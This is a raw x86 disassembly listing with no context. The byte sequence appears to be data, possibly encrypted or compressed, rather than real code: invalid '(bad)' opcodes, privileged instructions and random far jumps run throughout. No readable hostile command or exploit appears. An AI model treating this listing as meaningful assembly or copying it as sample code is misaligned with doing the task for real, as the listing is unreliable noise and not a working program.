  40325f:	call   0x2ee7967d
  403264:	inc    ebp
  403265:	out    dx,eax
  403266:	pop    ds
  403267:	(bad)  
  403268:	outs   dx,DWORD PTR ds:[esi]
  403269:	es mov edi,ss
  40326c:	jne    0x4032e9
  40326e:	arpl   WORD PTR [ebx+0x5c],ax
  403271:	scas   eax,DWORD PTR es:[edi]
  403272:	or     DWORD PTR [edi+0x5a],edx
  403275:	xchg   ecx,eax
  403276:	sub    cl,BYTE PTR [edx-0x56f83c96]
  40327c:	push   ebp
  40327d:	mov    ebx,0x2db170a7
  403282:	mov    ecx,0x380e9991
  403287:	in     eax,dx
  403288:	(bad)  
  403289:	mov    BYTE PTR ds:0x9bf6886d,ah
  40328f:	bound  esp,QWORD PTR [ebp-0x51de69f5]
  403295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403296:	lods   al,BYTE PTR ds:[esi]
  403297:	div    BYTE PTR [ebp-0x4c6b09b5]
  40329d:	push   0x587a7ae6
  4032a2:	test   eax,0x29f7963e
  4032a7:	jb     0x40329d
  4032a9:	sub    eax,DWORD PTR [esi]
  4032ab:	sahf   
  4032ac:	mov    ah,0x62
  4032ae:	push   esp
  4032af:	fisub  DWORD PTR [ecx]
  4032b1:	mov    ah,0x34
  4032b3:	push   ss
  4032b4:	dec    edi
  4032b5:	push   ecx
  4032b6:	xor    al,0x92
  4032b8:	das    
  4032b9:	dec    esp
  4032ba:	repz mov ebp,0x803d9338
  4032c0:	fucomi st,st(6)
  4032c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032c3:	jb     0x4032bb
  4032c5:	xchg   ebp,eax
  4032c6:	pop    ecx
  4032c7:	push   ds
  4032c8:	jmp    0x961d:0x2031c888
  4032cf:	mov    esp,0x1543275d
  4032d4:	xchg   ebp,eax
  4032d5:	and    eax,0x2e77adbe
  4032da:	mov    dl,0x27
  4032dc:	jne    0x4032ad
  4032de:	add    eax,0x356936a2
  4032e3:	shld   DWORD PTR [esi-0x14c878e2],eax,0xf4
  4032eb:	les    ecx,FWORD PTR [ebp-0x4b]
  4032ee:	dec    edi
  4032ef:	lahf   
  4032f0:	in     al,dx
  4032f1:	sahf   
  4032f2:	sti    
  4032f3:	add    al,0xc0
  4032f5:	outs   dx,BYTE PTR ds:[esi]
  4032f6:	outs   dx,BYTE PTR ds:[esi]
  4032f7:	jg     0x4032ac
  4032f9:	cmp    BYTE PTR [ebx+ebx*4+0x2c154c8],0x3c
  403301:	mul    ebx
  403303:	jb     0x4032f2
  403305:	cmp    al,0x1f
  403307:	jne    0x4032b2
  403309:	retf   0x527f
  40330c:	cli    
  40330d:	mov    al,0xf5
  40330f:	pop    eax
  403310:	push   es
  403311:	lods   eax,DWORD PTR ds:[esi]
  403312:	xchg   ebp,eax
  403313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403314:	mov    edx,0x3aa55c74
  403319:	cmp    bh,dh
  40331b:	gs pand mm5,mm7
  40331f:	aaa    
  403320:	jnp    0x4032fa
  403322:	sub    bh,BYTE PTR [edi+0x13f85d06]
  403328:	lock pop ecx
  40332a:	shl    DWORD PTR [edi],0xc9
  40332d:	ret    
  40332e:	outs   dx,DWORD PTR ds:[esi]
  40332f:	mov    eax,ds:0x3dbef17e
  403334:	xchg   ecx,eax
  403335:	mov    ds:0x8e80f625,al
  40333a:	inc    esi
  40333b:	jmp    0x4032e6
  40333d:	(bad)  [ebx]
  40333f:	clc    
  403340:	adc    ecx,ebx
  403342:	iret   
  403343:	in     eax,dx
  403344:	div    ch
  403346:	add    al,0xd6
  403348:	and    bh,bl
  40334a:	dec    esi
  40334b:	imul   eax,DWORD PTR [ebx+esi*4-0x24],0xffffffb4
  403350:	add    al,0x9c
  403352:	int3   
  403353:	in     eax,0x85
  403355:	jnp    0x4033aa
  403357:	pop    edx
  403358:	shl    DWORD PTR [ebp+0x7a],0xad
  40335c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40335d:	bound  edx,QWORD PTR [eax+edi*8+0x431cec94]
  403364:	mov    esp,0xe00aae83
  403369:	add    BYTE PTR [ebp-0xd],bl
  40336c:	ins    DWORD PTR es:[edi],dx
  40336d:	nop
  40336e:	xor    eax,0x2eebe1d5
  403373:	enter  0x6e2,0xba
  403377:	jl     0x403386
  403379:	test   al,0xc3
  40337b:	leave  
  40337c:	adc    eax,0x1b781bb2
  403381:	repz inc ecx
  403383:	ret    0x8e0c
  403386:	and    ebx,ebx
  403388:	test   al,0x23
  40338a:	shl    DWORD PTR [edi-0x44],0x7b
  40338e:	xchg   esi,eax
  40338f:	dec    esi
  403390:	out    0x9e,al
  403392:	pusha  
  403393:	xchg   edx,eax
  403394:	push   ss
  403395:	mov    WORD PTR [ebx],ds
  403397:	daa    
  403398:	rol    ebx,0xec
  40339b:	mov    BYTE PTR [edx-0xebdc1a2],cl
  4033a1:	lods   eax,DWORD PTR ds:[esi]
  4033a2:	inc    edi
  4033a3:	jo     0x403366
  4033a5:	scas   eax,DWORD PTR es:[edi]
  4033a6:	mov    edx,0xe9c4d5cf
  4033ab:	pop    edi
  4033ac:	out    dx,eax
  4033ad:	sub    BYTE PTR [edi+0x2ed9786a],bh
  4033b3:	push   edx
  4033b4:	mov    cl,0x5e
  4033b6:	xor    BYTE PTR [ebp-0x68e54f96],0xa8
  4033bd:	cld    
  4033be:	nop
  4033bf:	cmp    BYTE PTR [ecx+0x29],dh
  4033c2:	xor    ebp,DWORD PTR [ecx+ecx*1]
  4033c5:	xchg   ecx,eax
  4033c6:	(bad)  
  4033c7:	adc    DWORD PTR [ebp+0x70],ebx
  4033ca:	ror    BYTE PTR [edi-0x4a],0x6d
  4033ce:	arpl   WORD PTR [ebx+0x37556850],di
  4033d4:	xor    dh,BYTE PTR [esi+0x1b]
  4033d7:	and    DWORD PTR [ebx+0x3a],ebp
  4033da:	ins    BYTE PTR es:[edi],dx
  4033db:	fwait
  4033dc:	mov    al,0xb6
  4033de:	shr    BYTE PTR ds:0x4f073774,0xb4
  4033e5:	push   DWORD PTR [ecx-0x6e47bab7]
  4033eb:	pop    edi
  4033ec:	lds    edi,FWORD PTR [ebx-0x7f]
  4033ef:	pop    ecx
  4033f0:	xor    al,0x89
  4033f2:	pop    edx
  4033f3:	adc    DWORD PTR [ecx+0x5b43297e],esi
  4033f9:	sub    al,0x2
  4033fb:	fbstp  TBYTE PTR [ebx-0x25]
  4033fe:	imul   ecx,DWORD PTR [edi+0x4],0xffffffc2
  403402:	adc    ah,dl
  403404:	outs   dx,BYTE PTR ds:[esi]
  403405:	ins    BYTE PTR es:[edi],dx
  403406:	xor    edi,ebx
  403408:	adc    eax,DWORD PTR [ecx+eax*1+0x1e75cec1]
  40340f:	bound  edi,QWORD PTR [edx+0x2c]
  403412:	cmp    al,0xda
  403414:	jmp    0x437f10b5
  403419:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40341b:	test   eax,0x6073422
  403421:	stos   DWORD PTR es:[edi],eax
  403422:	leave  
  403423:	fild   DWORD PTR [ebx+0x4]
  403426:	sbb    ch,0xa3
  403429:	jae    0x4033dc
  40342b:	pop    edx
  40342c:	out    0x94,al
  40342e:	add    DWORD PTR [eax],edx
  403430:	fcomp  st(6)
  403432:	and    eax,0xd2ea4d22
  403437:	xchg   edx,eax
  403438:	pop    ss
  403439:	mov    ds:0x47efebe4,eax
  40343e:	fldcw  WORD PTR [eax-0xa]
  403441:	ds jmp 0x4033fa
  403444:	hlt    
  403445:	push   0x3e
  403447:	dec    edi
  403448:	jmp    0x403409
  40344a:	inc    ecx
  40344b:	inc    esi
  40344c:	cmp    eax,0x5fb4138a
  403451:	mov    edx,0xbc705a8
  403456:	hlt    
  403457:	inc    ecx
  403458:	call   0xc369:0x30e6fc69
  40345f:	call   0x376a2785
  403464:	jle    0x403476
  403466:	adc    dh,BYTE PTR [ebp-0x51]
  403469:	xlat   BYTE PTR ds:[ebx]
  40346a:	lahf   
  40346b:	push   0xd5aa1d05
  403470:	xchg   edx,eax
  403471:	pushf  
  403472:	daa    
  403473:	shl    BYTE PTR [esi],0x97
  403476:	jae    0x40342c
  403478:	test   eax,0x51961f0e
  40347d:	xchg   ecx,eax
  40347e:	fs cmp al,0x81
  403481:	aas    
  403482:	rol    bh,cl
  403484:	or     eax,DWORD PTR [ecx]
  403486:	dec    esi
  403487:	pop    esp
  403488:	xchg   ecx,eax
  403489:	pop    eax
  40348a:	mov    BYTE PTR [esi+0x15e5cbae],bl
  403490:	hlt    
  403491:	popa   
  403492:	stos   BYTE PTR es:[edi],al
  403493:	popa   
  403494:	cmp    BYTE PTR ds:0xecd091a9,al
  40349a:	in     eax,0x9b
  40349c:	dec    eax
  40349d:	mov    ebx,0x93fa537
  4034a2:	mov    edi,0x670dc10d
  4034a7:	ret    
  4034a8:	imul   edx,DWORD PTR ds:0x8493d07e,0x64
  4034af:	inc    ebx
  4034b0:	sbb    al,0xec
  4034b2:	cmp    eax,0x8b70e20b
  4034b7:	mov    ebx,0xad8fb1b6
  4034bc:	dec    eax
  4034bd:	(bad)  [esi]
  4034bf:	sar    DWORD PTR [eax+0x6f],cl
  4034c2:	retf   
  4034c3:	dec    eax
  4034c4:	push   esi
  4034c5:	adc    edi,esi
  4034c7:	stc    
  4034c8:	push   0x11
  4034ca:	ins    BYTE PTR es:[edi],dx
  4034cb:	adc    DWORD PTR [ecx+0x3a2ca301],ecx
  4034d1:	mov    al,ds:0x74691f9
  4034d6:	pop    ds
  4034d7:	xchg   edx,eax
  4034d8:	mov    dl,0x53
  4034da:	test   eax,0xf539aacb
  4034df:	or     bl,BYTE PTR [ebx+0x4185521]
  4034e5:	sub    bh,cl
  4034e7:	push   0x9baddda8
  4034ec:	jns    0x403542
  4034ee:	std    
  4034ef:	cli    
  4034f0:	loop   0x403482
  4034f2:	and    DWORD PTR [edi+esi*1],esp
  4034f5:	retf   
  4034f6:	jmp    DWORD PTR [ebx-0x4004e59f]
  4034fc:	push   es
  4034fd:	aas    
  4034fe:	and    eax,0xe6bf4368
  403503:	xchg   eax,esi
  403505:	add    DWORD PTR [edx],eax
  403507:	cmc    
  403508:	cmp    BYTE PTR [ecx+0x8],dh
  40350b:	sti    
  40350c:	push   ebp
  40350d:	aam    0xf4
  40350f:	repz test BYTE PTR [ecx+edi*1-0x413a720],al
  403517:	scas   al,BYTE PTR es:[edi]
  403518:	fnstsw WORD PTR [ecx+0x74095aff]
  40351e:	push   0xe61423f6
  403523:	outs   dx,BYTE PTR ds:[esi]
  403524:	ds mov ah,0x4e
  403527:	scas   al,BYTE PTR es:[edi]
  403528:	lds    edx,FWORD PTR [esp+ebx*4]
  40352b:	inc    ebp
  40352c:	test   BYTE PTR [ebx-0x285761a2],dl
  403532:	sub    eax,0xacd07515
  403537:	scas   eax,DWORD PTR es:[edi]
  403538:	xchg   bh,al
  40353a:	in     eax,dx
  40353b:	mul    BYTE PTR [ecx]
  40353d:	adc    BYTE PTR [edx+edi*4+0x63dda562],bh
  403544:	loopne 0x403535
  403546:	dec    eax
  403547:	popf   
  403548:	loopne 0x403530
  40354a:	jns    0x403550
  40354c:	adc    al,cl
  40354e:	pop    ebp
  40354f:	mov    bl,0xee
  403551:	cli    
  403552:	mov    esp,ebx
  403554:	pop    ebx
  403555:	clc    
  403556:	pop    ebp
  403557:	stos   DWORD PTR es:[edi],eax
  403558:	ret    0x421f
  40355b:	inc    ebp
  40355c:	les    eax,FWORD PTR [edx]
  40355e:	fistp  WORD PTR [esi+0x6a0e5b56]
  403564:	retf   0xb475
  403567:	data16 mov ah,0xe
  40356a:	mov    ecx,0x9735c7f8
  40356f:	jb     0x40359e
  403571:	int3   
  403572:	pop    esp
  403573:	aad    0x26
  403575:	adc    esi,DWORD PTR [esi+0x17]
  403578:	jmp    0xe57b:0x3d182201
  40357f:	jmp    0xe4d56a4
  403584:	ret    0x63cc
  403587:	hlt    
  403588:	ret    0xa975
  40358b:	out    dx,al
  40358c:	cmp    eax,0x2972f06
  403591:	mov    DWORD PTR [ecx],eax
  403593:	jecxz  0x4035fb
  403595:	leave  
  403596:	cmc    
  403597:	mov    ch,0x6b
  403599:	outs   dx,DWORD PTR ds:[esi]
  40359a:	xchg   edx,eax
  40359b:	aas    
  40359c:	push   edi
  40359d:	lea    edx,[ebp+0x48]
  4035a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035a1:	xchg   eax,eax
  4035a3:	(bad)  
  4035a4:	cli    
  4035a5:	loope  0x40356c
  4035a7:	xor    al,0x49
  4035a9:	push   es
  4035aa:	jne    0x4035a1
  4035ac:	fild   QWORD PTR [eax+0x50]
  4035af:	push   ecx
  4035b0:	shr    DWORD PTR [eax+eiz*2],0x7d
  4035b4:	maxps  xmm6,XMMWORD PTR [ebx]
  4035b7:	adc    BYTE PTR [ecx],0x4c
  4035ba:	sbb    DWORD PTR [esi],esp
  4035bc:	enter  0x151d,0xe7
  4035c0:	loopne 0x403602
  4035c2:	jo     0x403625
  4035c4:	mov    ebx,0xa90ac7b2
  4035c9:	sbb    dl,BYTE PTR [eax+0x23fb63e3]
  4035cf:	jecxz  0x4035a8
  4035d1:	adc    BYTE PTR [edi],bl
  4035d3:	xor    BYTE PTR [eax+0x39a9555e],cl
  4035d9:	mov    ds:0x753a041d,eax
  4035de:	sti    
  4035df:	sbb    DWORD PTR [eax-0x5f547f0e],esi
  4035e5:	in     eax,0xac
  4035e7:	xor    eax,0x8dc475ee
  4035ec:	outs   dx,DWORD PTR ds:[esi]
  4035ed:	rcl    DWORD PTR [esi+0xb],0xee
  4035f1:	push   edi
  4035f2:	mov    DWORD PTR [edx+0x33],ebp
  4035f5:	mov    eax,0x8ff37551
  4035fa:	or     ah,BYTE PTR [esi-0x4a]
  4035fd:	clc    
  4035fe:	popa   
  4035ff:	dec    esp
  403600:	cmp    cl,BYTE PTR [ebp-0x683537d3]
  403606:	cmp    esp,DWORD PTR [edx-0x51]
  403609:	inc    ebx
  40360a:	cld    
  40360b:	ins    BYTE PTR es:[edi],dx
  40360c:	test   al,0x59
  40360e:	add    bl,dl
  403610:	fldenv [ebx]
  403612:	cmp    BYTE PTR [ecx-0x7a],ch
  403615:	push   esp
  403616:	lahf   
  403617:	pop    ecx
  403618:	cmp    al,0x6f
  40361a:	pop    ecx
  40361b:	pop    edi
  40361c:	fbstp  TBYTE PTR [ebp-0x1f]
  40361f:	xchg   edx,eax
  403620:	fwait
  403621:	cli    
  403622:	mov    ch,0xcb
  403624:	pop    esi
  403625:	imul   ebx,DWORD PTR [esi+0x7aa595e9],0xffffffde
  40362c:	(bad)  
  40362d:	mov    ebx,0x6aac89f9
  403632:	push   edi
  403633:	add    eax,0xf8676ec7
  403638:	shl    BYTE PTR [ecx+0x4d0999a7],0xa0
  40363f:	pop    esi
  403640:	mov    dh,0x36
  403642:	out    0x31,eax
  403644:	dec    ebx
  403645:	add    dl,BYTE PTR [edx]
  403647:	push   esi
  403648:	pusha  
  403649:	imul   edi,DWORD PTR [ecx],0xef5bc339
  40364f:	repz dec ebx
  403651:	(bad)  
  403653:	shr    esi,1
  403655:	mov    al,0xb0
  403657:	pusha  
  403658:	and    cl,bh
  40365a:	pop    edi
  40365b:	jecxz  0x403663
  40365d:	daa    
  40365e:	(bad)  
  40365f:	nop
  403660:	or     eax,0xf868c5d3
  403665:	enter  0xfcb4,0x62
  403669:	add    eax,0x74acf0ce
  40366e:	fcmovu st,st(0)
  403670:	stos   DWORD PTR es:[edi],eax
  403671:	push   edx
  403672:	xor    bh,dh
  403674:	xor    DWORD PTR [ecx-0x69],edx
  403677:	push   0xffffffa7
  403679:	call   0x988785ab
  40367e:	cwde   
  40367f:	repnz jecxz 0x4036cb
  403682:	outs   dx,DWORD PTR ds:[esi]
  403683:	mov    dh,0x22
  403685:	xor    al,0xb4
  403687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403688:	adc    al,0x6d
  40368a:	cmp    DWORD PTR [esi-0x42],ecx
  40368d:	jg     0x403660
  40368f:	or     BYTE PTR [esi-0x27],0x99
  403693:	add    DWORD PTR [edx+0x35ee7b2e],edi
  403699:	sbb    DWORD PTR [ebx],0x207df2c3
  40369f:	stos   BYTE PTR es:[edi],al
  4036a0:	and    ecx,DWORD PTR [ebx]
  4036a2:	mov    al,0xb4
  4036a4:	mov    bl,0xad
  4036a6:	inc    DWORD PTR [edx]
  4036a8:	(bad)  
  4036a9:	mov    es,esi
  4036ab:	fiadd  WORD PTR ds:0x78de51af
  4036b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036b2:	mov    ecx,0xa81b81b4
  4036b7:	aaa    
  4036b8:	mov    bh,0x40
  4036ba:	mov    ds:0x7791a0df,eax
  4036bf:	jne    0x4036d1
  4036c1:	jge    0x403682
  4036c3:	ret    
  4036c4:	xor    edx,DWORD PTR es:[edi+0x14438344]
  4036cb:	int    0x27
  4036cd:	xor    DWORD PTR [edx],edi
  4036cf:	lock rol dh,cl
  4036d2:	fwait
  4036d3:	mov    ecx,0x1df3d3c5
  4036d8:	iret   
  4036d9:	popa   
  4036da:	adc    bh,BYTE PTR [ebx+0x444df366]
  4036e0:	fidivr WORD PTR fs:[edi]
  4036e3:	jp     0x40375b
  4036e5:	or     al,0x44
  4036e7:	inc    ebp
  4036e8:	in     eax,dx
  4036e9:	lds    esp,FWORD PTR [edi-0x61]
  4036ec:	or     al,0xd4
  4036ee:	lea    esi,[eax-0x635509c1]
  4036f4:	out    0xfa,eax
  4036f6:	out    dx,al
  4036f7:	test   al,0x3c
  4036f9:	mov    bh,0x36
  4036fb:	jb     0x40371c
  4036fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036fe:	lea    esp,[eax-0x6e]
  403701:	add    eax,0x7f701f2b
  403706:	icebp  
  403707:	in     eax,0xfd
  403709:	push   es
  40370a:	cmp    ch,al
  40370c:	sbb    eax,0x79c16335
  403711:	mov    cl,0xda
  403713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403714:	inc    ebx
  403715:	imul   ecx,DWORD PTR [ecx-0x6d],0xf6d56d7f
  40371c:	in     eax,0xfe
  40371e:	retf   
  40371f:	sbb    BYTE PTR [eax],cl
  403721:	sbb    BYTE PTR [ebx+0x8],dl
  403724:	cmp    ecx,DWORD PTR [ebp+0x62]
  403727:	sub    DWORD PTR [ebx+eax*2],0x79
  40372b:	push   ds
  40372c:	ins    DWORD PTR es:[edi],dx
  40372d:	xor    ebx,DWORD PTR [edx+0x514e1e7c]
  403733:	arpl   WORD PTR [ebp-0x5aea9fa4],cx
  403739:	sbb    ebx,DWORD PTR [ecx+0x2c938130]
  40373f:	adc    edi,esi
  403741:	inc    ecx
  403742:	xchg   BYTE PTR [ebx-0x3aadf260],bh
  403748:	xchg   bl,ah
  40374a:	lahf   
  40374b:	es dec ecx
  40374d:	mov    WORD PTR [eax+0x48aad140],?
  403753:	femms  
  403755:	dec    ebp
  403756:	out    0x4,eax
  403758:	cmp    DWORD PTR [edx],0x4b4a9ed
  40375e:	pop    ds
  40375f:	adc    eax,0x313323cf
  403764:	mov    ecx,0xaabc6ffa
  403769:	pop    ebx
  40376a:	int3   
  40376b:	mov    bh,BYTE PTR [edi-0x6b]
  40376e:	scas   eax,DWORD PTR es:[edi]
  40376f:	ins    DWORD PTR es:[edi],dx
  403770:	mov    edx,0x9a0d56e7
  403775:	pop    ebx
  403776:	sbb    DWORD PTR [eax-0x92ff],esi
  40377c:	add    al,0xb5
  40377e:	(bad)  
  403780:	push   edx
  403781:	mov    edi,fs
  403783:	sahf   
  403784:	sti    
  403785:	jl     0x403804
  403787:	ret    
  403788:	mov    cs,WORD PTR [eax+0xc]
  40378b:	icebp  
  40378c:	sub    al,0xe2
  40378e:	(bad)  
  40378f:	sbb    eax,DWORD PTR [edx+0x75a6af59]
  403795:	in     al,0x29
  403797:	add    al,cl
  403799:	dec    ebp
  40379a:	test   BYTE PTR [eax-0x52f7110d],dl
  4037a0:	or     DWORD PTR [ebx-0xa416eb9],ebp
  4037a6:	aad    0x5c
  4037a8:	pextrw esi,(bad),0xc5
  4037aa:	mov    ch,0x80
  4037ac:	scas   al,BYTE PTR es:[edi]
  4037ad:	aaa    
  4037ae:	popa   
  4037af:	mov    esp,0x1218c2d7
  4037b4:	pushf  
  4037b5:	js     0x403744
  4037b7:	sub    ebx,DWORD PTR [esi-0x25]
  4037ba:	push   ebp
  4037bb:	add    DWORD PTR [ecx+ebp*8+0x57],edx
  4037bf:	repnz ror DWORD PTR [ecx+0xe4718cb],0xda
  4037c7:	push   esi
  4037c8:	or     ch,al
  4037ca:	mov    ?,WORD PTR [ebp+0x3f]
  4037cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037ce:	popf   
  4037cf:	inc    edi
  4037d0:	jmp    0x40383c
  4037d2:	shl    DWORD PTR [ecx],1
  4037d4:	xlat   BYTE PTR ds:[ebx]
  4037d5:	jl     0x4037cb
  4037d7:	inc    DWORD PTR ds:0x1aff46ab
  4037dd:	outs   dx,DWORD PTR ds:[esi]
  4037de:	sub    al,0x82
  4037e0:	adc    eax,0x700fc3cb
  4037e5:	sahf   
  4037e6:	and    ecx,ecx
  4037e8:	adc    bh,ch
  4037ea:	dec    ebx
  4037eb:	jb     0x4037cd
  4037ed:	je     0x4037cd
  4037ef:	sbb    BYTE PTR ds:0x6c150b36,dl
  4037f5:	in     al,dx
  4037f6:	lds    ebp,FWORD PTR [edx+0x1207fd82]
  4037fc:	mov    ch,0x5
  4037fe:	xchg   ebp,eax
  4037ff:	cmp    BYTE PTR [ebx],bh
  403801:	xchg   ebp,eax
  403802:	adc    DWORD PTR [ecx+0x67ffd5c0],eax
  403808:	inc    edx
  403809:	push   edx
  40380a:	push   cs
  40380b:	cmp    al,0xe9
  40380d:	ss push ss
  40380f:	sbb    dl,BYTE PTR [ecx]
  403811:	popa   
  403812:	int3   
  403813:	pop    esp
  403814:	inc    ebp
  403815:	outs   dx,DWORD PTR ds:[esi]
  403816:	dec    esp
  403817:	push   ebp
  403818:	out    dx,al
  403819:	retf   0x377b
  40381c:	or     edx,DWORD PTR [eax-0x41b1429f]
  403822:	jp     0x403840
  403824:	scas   ax,WORD PTR es:[edi]
  403826:	ss neg eax
  403829:	xlat   BYTE PTR ds:[ebx]
  40382a:	mov    al,ds:0x9a043d54
  40382f:	test   BYTE PTR [esi+0x3e466f28],cl
  403835:	pop    es
  403836:	addr16 mov cl,0xff
  403839:	xchg   edi,eax
  40383a:	jb     0x4037cf
  40383c:	dec    esp
  40383d:	jle    0x4037f1
  40383f:	data16 (bad) 
  403841:	pop    edx
  403842:	fstp   TBYTE PTR [ebp+0x30]
  403845:	jbe    0x4037da
  403847:	mov    cs,WORD PTR cs:[edi-0x56]
  40384b:	dec    edx
  40384c:	push   edx
  40384d:	int3   
  40384e:	or     cl,BYTE PTR [edi-0x4d]
  403851:	cmp    DWORD PTR [ebx-0x7c],edx
  403854:	mov    ds:0xaaf9f28d,eax
  403859:	cmp    cl,BYTE PTR [edi-0x5888412e]
  40385f:	mov    esi,0x581d66d5
  403864:	sub    al,0xcd
  403866:	adc    eax,0xde6653e9
  40386b:	and    ch,dh
  40386d:	push   edi
  40386e:	ss (bad) 
  403870:	test   DWORD PTR [ecx+0x494017d4],0x43063ad0
  40387a:	rol    BYTE PTR [esi-0x24bc6697],1
  403880:	retf   0x2014
  403883:	lahf   
  403884:	cs sbb eax,0xddb6f81
  40388a:	push   ecx
  40388b:	jmp    0x711d:0x19dd760d
  403892:	pop    esp
  403893:	das    
  403894:	mov    dl,BYTE PTR [eax]
  403896:	sbb    al,BYTE PTR [eax-0x6dd2fb57]
  40389c:	sub    eax,0x3b80a99
  4038a1:	(bad)  
  4038a2:	pop    edx
  4038a3:	jle    0x403906
  4038a5:	adc    BYTE PTR [esi+0xf],dh
  4038a8:	lahf   
  4038a9:	sub    eax,0xfcc32dbf
  4038ae:	xchg   edx,eax
  4038af:	mov    ah,0x8d
  4038b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038b2:	add    esi,DWORD PTR [ecx]
  4038b4:	xchg   ecx,eax
  4038b5:	pop    edx
  4038b6:	fst    DWORD PTR [esi]
  4038b8:	push   ebx
  4038b9:	xchg   esi,eax
  4038ba:	scas   al,BYTE PTR es:[edi]
  4038bb:	sbb    bl,0xcf
  4038be:	jne    0x40387e
  4038c0:	mov    ah,0x4d
  4038c2:	scas   al,BYTE PTR es:[edi]
  4038c3:	adc    eax,0xc58e5176
  4038c8:	push   cs
  4038c9:	dec    edx
  4038ca:	push   esi
  4038cb:	loope  0x403896
  4038cd:	push   es
  4038ce:	out    0xb7,eax
  4038d0:	jo     0x4038b5
  4038d2:	imul   edi,DWORD PTR [eax+0x658f2b3a],0x42
  4038d9:	fwait
  4038da:	mov    bh,0xce
  4038dc:	mov    eax,ds:0x834435b4
  4038e1:	int3   
  4038e2:	popf   
  4038e3:	repz fistp DWORD PTR [esi+eax*2+0x40fd03a8]
  4038eb:	jmp    0xa8147b51
  4038f0:	inc    esp
  4038f1:	xchg   edi,eax
  4038f2:	cdq    
  4038f3:	mov    cl,0xa1
  4038f5:	xor    eax,0x93e7e506
  4038fa:	(bad)  
  4038fc:	test   BYTE PTR [eax+0x6b],cl
  4038ff:	lock repnz adc edx,DWORD PTR [eax]
  403903:	nop
  403904:	lods   eax,DWORD PTR ds:[esi]
  403905:	mov    WORD PTR [ebp-0x7dd1ca5e],?
  40390b:	push   esp
  40390c:	lea    ebp,[esi+0x1f]
  40390f:	daa    
  403910:	shl    bh,0xfe
  403913:	clts   
  403915:	jg     0x40395d
  403917:	pop    ds
  403918:	ins    BYTE PTR es:[edi],dx
  403919:	fidiv  DWORD PTR [eax]
  40391b:	push   ds
  40391c:	(bad)  
  40391d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40391e:	sbb    DWORD PTR [ebx+0x4053f1d0],ebp
  403924:	cld    
  403925:	sub    edx,DWORD PTR [eax]
  403927:	jmp    0x4038f9
  403929:	pop    ds
  40392a:	jns    0x4038b8
  40392c:	pcmpeqb mm1,QWORD PTR ds:0xe523fbec
  403933:	cmp    eax,0x1aa24aa3
  403938:	je     0x40396d
  40393a:	jp     0x40394c
  40393c:	mov    DWORD PTR ds:0x3ac5d2c0,ebx
  403942:	retf   
  403943:	add    ebp,ecx
  403945:	ins    DWORD PTR es:[edi],dx
  403946:	popa   
  403947:	mov    ds:0xf56bb4d9,eax
  40394c:	mov    ah,0xaa
  40394e:	stos   DWORD PTR es:[edi],eax
  40394f:	aaa    
  403950:	dec    esp
  403951:	pop    ebp
  403952:	loopne 0x403983
  403954:	xchg   esi,eax
  403955:	sub    DWORD PTR [edi-0x77],0xdd174fed
  40395c:	icebp  
  40395d:	inc    BYTE PTR [ecx+0x38]
  403960:	adc    BYTE PTR [edx+0x19ffee2d],cl
  403966:	inc    esi
  403967:	and    al,0xdb
  403969:	and    ebx,DWORD PTR [eax]
  40396b:	jno    0x4039cc
  40396d:	cmp    ch,BYTE PTR [ebx+esi*4+0x13d22294]
  403974:	inc    esi
  403975:	retf   0xc5af
  403978:	(bad)  
  403979:	out    0x87,eax
  40397b:	dec    edx
  40397c:	dec    edi
  40397d:	inc    edi
  40397e:	aaa    
  40397f:	int3   
  403980:	sti    
  403981:	mov    bl,0x5
  403983:	jg     0x403905
  403985:	xor    al,0xce
  403987:	stc    
  403988:	mov    ch,0x3c
  40398a:	push   esi
  40398b:	xchg   BYTE PTR [edx-0x3e],ah
  40398e:	je     0x4039df
  403990:	or     BYTE PTR [esi-0x19],ah
  403993:	in     eax,0xb1
  403995:	(bad)  
  403996:	mov    edx,0xde77475
  40399b:	fiadd  WORD PTR ds:0x83ec522c
  4039a1:	mov    DWORD PTR [esi+0x33],edi
  4039a4:	(bad)  
  4039a5:	or     bl,ch
  4039a7:	jp     0x403a13
  4039a9:	mov    esi,?
  4039ab:	test   edx,0xcd604c68
  4039b1:	pop    eax
  4039b2:	push   esi
  4039b3:	out    dx,al
  4039b4:	ds enter 0x4bf0,0xed
  4039b9:	icebp  
  4039ba:	push   ebx
  4039bb:	cmp    DWORD PTR [eax],ecx
  4039bd:	sub    eax,0x729f1984
  4039c2:	test   al,0x86
  4039c4:	int    0x27
  4039c6:	jmp    0xf336:0x6378ae18
  4039cd:	jmp    0x7950:0x16701707
  4039d4:	sub    eax,0xde2a4a58
  4039d9:	std    
  4039da:	leave  
  4039db:	lods   al,BYTE PTR ds:[esi]
  4039dc:	and    al,0x60
  4039de:	pusha  
  4039df:	test   esi,0xaaec8806
  4039e5:	push   ds
  4039e6:	jno    0x4039d6
  4039e8:	test   BYTE PTR [ebp+0x38b9e27c],bl
  4039ee:	mov    ebx,DWORD PTR [ebx+ebp*1-0x79]
  4039f2:	ret    0x4f06
  4039f5:	mov    fs,WORD PTR [ebx+edi*1+0x66]
  4039f9:	inc    edi
  4039fa:	push   cs
  4039fb:	sbb    al,0x62
  4039fd:	gs retf 0xd363
  403a01:	jae    0x4039d5
  403a03:	add    ah,BYTE PTR [ebx]
  403a05:	lahf   
  403a06:	popa   
  403a07:	test   al,0x94
  403a09:	cmp    DWORD PTR [edx],ebx
  403a0b:	push   ds
  403a0c:	push   ecx
  403a0d:	test   eax,0x20316275
  403a12:	cwde   
  403a13:	xchg   ebx,eax
  403a14:	and    eax,0x2b1c12f4
  403a19:	dec    esp
  403a1a:	jo     0x403a31
  403a1c:	mov    edi,0xa61c51bb
  403a21:	push   edi
  403a22:	(bad)  
  403a24:	mov    eax,ds:0xbcff3fb3
  403a29:	retf   0x4ab6
  403a2c:	out    0x4,al
